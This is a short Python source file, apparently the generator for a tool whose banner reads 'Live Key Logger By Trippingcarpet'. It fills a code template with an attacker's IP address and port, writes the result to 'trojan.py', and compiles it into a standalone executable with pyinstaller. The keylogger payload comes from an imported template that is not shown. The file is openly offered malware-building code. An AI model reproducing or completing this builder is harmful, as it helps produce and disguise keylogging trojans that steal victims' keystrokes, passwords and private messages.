from template import code
import os 
from colorama import Fore

banner = """
   ▄█   ▄█▄    ▄████████    ▄████████    ▄█   ▄█▄    ▄████████ ███▄▄▄▄
  ███ ▄███▀   ███    ███   ███    ███   ███ ▄███▀   ███    ███ ███▀▀▀██▄
  ███▐██▀     ███    ███   ███    ███   ███▐██▀     ███    █▀  ███   ███
 ▄█████▀     ▄███▄▄▄▄██▀   ███    ███  ▄█████▀     ▄███▄▄▄     ███   ███
▀▀█████▄    ▀▀███▀▀▀▀▀   ▀███████████ ▀▀█████▄    ▀▀███▀▀▀     ███   ███
  ███▐██▄   ▀███████████   ███    ███   ███▐██▄     ███    █▄  ███   ███
  ███ ▀███▄   ███    ███   ███    ███   ███ ▀███▄   ███    ███ ███   ███
  ███   ▀█▀   ███    ███   ███    █▀    ███   ▀█▀   ██████████  ▀█   █▀
  ▀           ███    ███                ▀
       Live Key Logger By Trippingcarpet | @trippingcarpet
"""


def generate(ip, port):
    with open("trojan.py","w") as file:
        file.write(code.format(str(ip),port,"""\\n"""))

def compile_to_exe():
  files = os.listdir()
  
  if "trojan.py" not in files:
    print(Fore.RED + "#Something went wrong in Generation")

  else: 
    os.system("pyinstaller trojan.py --onefile")
